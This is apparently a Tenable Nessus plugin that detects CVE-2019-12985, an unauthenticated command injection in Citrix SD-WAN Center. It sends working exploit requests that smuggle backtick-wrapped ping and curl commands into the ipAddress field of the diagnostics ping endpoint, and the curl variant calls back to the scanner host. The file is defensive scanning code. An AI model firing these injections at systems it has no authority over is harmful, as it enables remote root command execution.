#TRUSTED 01872f74cad8071c93a7c2a032b780e975891991e1bc7154436227a988666a13bdda81df90fae6f60c6ac80918aef1bf1c07b0592af276e1b7e7f570ffc947a45b13d78749a5517a4655ce28b297c8bb1c6264a1ddeb0396f55fea64f03d75b54c5ae6801aa0757b85a4d599749541aeaef124eb94540a543922c35533833f0652291efaa42a0097fb9709d39a52f6fb418b1b87c4612ab02cf00bc0f3590f2dd2b4964ef9ae80f269f80ced408f15a96890a25aed483d9d61e0aa0e736307a32fec11fe4c6fbb4964772a2a6f3e9c6107b47153bf2f757cb418d3a9531e630c2654e6895f4e45e63e3117551a4c6d92b40915b86d6ee27ad2e88a8825e7d59a5dc29aee02e6c3e0970d18d2a62bf3ca14bd89ab9781173f50206c8107f759c2c352660c3b247dedaffb564d951b767c6d2cec5230884e8d93e1ce79deb394242267d206e62bffdd7dbbe6601a3053f860daa0b20d7c7aa54d92ab87e15c52bc1a7cab1547376b65d5de0ccbdf7b2d261d4cfa2e33905984eace008a1a740ed365979b517ec183239311107fa7e175c7e43ab628733c98696832488827b911f2b25b3860d43c116f457ae8422ef02f30383c035d645f0f34e31f48b19254bfa76a7eb65010d449fe4781c14249ae1c6149527fb3160262f88f1da6eebf1b8e604fe938f22b9345dfa7af493ee0ad19a06a036c23a8a3d914757f43410c66f791
#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(128304);
  script_version("1.6");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2019-12985");
  script_bugtraq_id(109133);
  script_xref(name:"TRA", value:"TRA-2019-31");

  script_name(english:"Citrix SD-WAN Center Unauthenticated Remote Command Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix SD-WAN Center is affected by a remote command injection vulnerability due to improper
sanitization of user-supplied input in the ping action of DiagnosticController. An unauthenticated, remote attacker
can exploit this, via a specially crafted HTTP request, to execute arbitrary commands on the remote host with root
privileges.

Note that Nessus can perform an additional check for this vulnerability. To do so, re-run the scan with the setting
'Perform thorough tests (may disrupt your network or impact scan speed)' enabled.");
  script_set_attribute(attribute:"see_also", value:"https://support.citrix.com/article/CTX251987");
  # https://www.tenable.com/blog/multiple-vulnerabilities-found-in-citrix-sd-wan-center-and-sd-wan-appliances
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a1b1f9a7");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 10.2.3 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-12985");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/07/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/06/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/08/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:citrix:sd-wan-center");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("citrix_sdwan_center_detect.nbin");
  script_require_keys("installed_sw/Citrix SD-WAN Center");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('install_func.inc');
include('misc_func.inc');
include('http.inc');
include('spad_log_func.inc');

##
# RCE exploitation of the ping action in DiagnosticController with an injected ping
#
# @remark Check RCE by suppling a ping command containing specific padding data to the ping action in DiagnosticController
#
# @return array containing: a boolean that is true if the SD-WAN center is
# vulnerable as well as information for security report if necessary.
##
function check_ping() {
  var ping_injection = 'ipAddress=%60ping+-c+10+-p+' + pattern + '+' + compat::this_host() + '%60';
  spad_log(message:'Attempting to inject ping with \'' + ping_injection + '\'\n');

  var ping_request =
    'POST /Collector/diagnostics/ping HTTP/1.1\r\n' +
    'Host: ' + get_host_ip() + ':' + port + '\r\n' +
    'Content-Type: application/x-www-form-urlencoded\r\n' +
    'Content-Length: ' + len(ping_injection) + '\r\n' +
    '\r\n' +
    ping_injection;

  var soc = open_sock_tcp(port);
  if (!soc)
  {
    spad_log(message:'Failed to open a TCP socket\n');
    audit(AUDIT_SOCK_FAIL, port);
  }

  var filter = 'icmp and icmp[0] = 8 and src host ' + get_host_ip();
  var ping_response = send_capture(socket:soc, data:ping_request, pcap_filter:filter);
  close(soc);

  if (empty_or_null(ping_response))
  {
    spad_log(message:'The ICMP response was empty or null\n');
    return {'vuln':false};
  }

  var icmp_data = toupper(hexstr(get_icmp_element(icmp:ping_response, element:'data')));
  spad_log(message:'Received ping with data: \n' + icmp_data);

  if (empty_or_null(icmp_data))
  {
    spad_log(message:'The ICMP data was empty or null\n');
    return {'vuln':false};
  }

  if (pattern >!< icmp_data)
    return {'vuln':false};

  var rep_extra = '\nFollowing this request, Nessus received a ping with data:\n\n' + icmp_data;
  return {'vuln':true, 'request':make_list(ping_request), 'rep_extra':rep_extra};
}

##
# RCE exploitation of the ping action in DiagnosticController with an injected curl
#
# @remark Check RCE by suppling a curl command to the ping action in DiagnosticController
#
# @return array containing: a boolean that is true if the SD-WAN center is
# vulnerable as well as information for security report if necessary.
##
function check_curl() {
  # Open TCP socket on server to get back connections from targets
  var bind_result = bind_sock_tcp();

  if (isnull(bind_result))
    audit(AUDIT_SOCK_FAIL, port);

  var bind_sock = bind_result[0];
  var bind_port = bind_result[1];

  spad_log(message:'Attempting exploitation with back connect port: ' + bind_port + '\n');

  var curl_injection = 'ipAddress=%60curl+' + compat::this_host() + ':' + bind_port + '/Nessus' + pattern + '%60';
  spad_log(message:'Attempting to inject curl with \'' + curl_injection + '\'\n');

  var post_response = http_send_recv3(
    method        : 'POST',
    item          : '/Collector/diagnostics/ping',
    port          : port,
    content_type  : 'application/x-www-form-urlencoded',
    data          : curl_injection,
    exit_on_fail  : FALSE
  );

  if (!empty_or_null(post_response))
    spad_log(message:'The POST response was:\n' + post_response + '\n');

  # Listen for HTTP connect back
  var accept_sock = sock_accept(socket:bind_sock, timeout:10);
  if (!accept_sock)
  {
    close(bind_sock);
    spad_log(message:'Did not receive a connect back.\n');
    return {'vuln':false};
  }

  var curl_response = recv(socket:accept_sock, length:1024);

  if (empty_or_null(curl_response))
  {
    close(accept_sock);
    close(bind_sock);
    spad_log(message:'Empty response.\n');
    return {'vuln':false};
  }

  spad_log(message:'Successful connect back, received response: \n' + curl_response);

  close(accept_sock);
  close(bind_sock);

  if ('Nessus' + pattern >!< curl_response)
    return {'vuln':false};

  var rep_extra = '\nSuccessful connect back, received response:\n\n' + curl_response;
  return {'vuln':true, 'request':make_list(http_last_sent_request()), 'rep_extra':rep_extra};
}

#
# Main
#

app_name = 'Citrix SD-WAN Center';
# Exit if app is not detected on the target host
get_install_count(app_name:app_name, exit_if_zero:TRUE);
port = get_http_port(default:443);

# Exit if app is not detected  on this port
get_single_install(
  app_name : app_name,
  port     : port
);

# Generate a random pattern for the payload to prove the vulnerability
pattern = rand_str(length:8, charset:'0123456789ABCDEF');

# Try to inject and detect a ping with the pattern
result = check_ping();

# If the ping injection did not succeed (e.g. no ping response was received, no
# ICMP data was received or the pattern was not found in the ICMP data) and
# thorough tests is disabled, then audit as not vulnerable.
if (!result['vuln'] && !thorough_tests)
  audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

# If the ping injection did not succeed and thorough tests is enabled, try to
# inject curl and listen for an incoming request.
if (!result['vuln'] && thorough_tests)
  result = check_curl();

# If neither command injection succeeded, then audit as not vulnerable.
if (!result['vuln'])
  audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

# Otherwise, a command injection succeeded so report it as vulnerable
security_report_v4(
  port: port,
  severity: SECURITY_HOLE,
  generic: TRUE,
  request: result['request'],
  rep_extra: result['rep_extra']
);
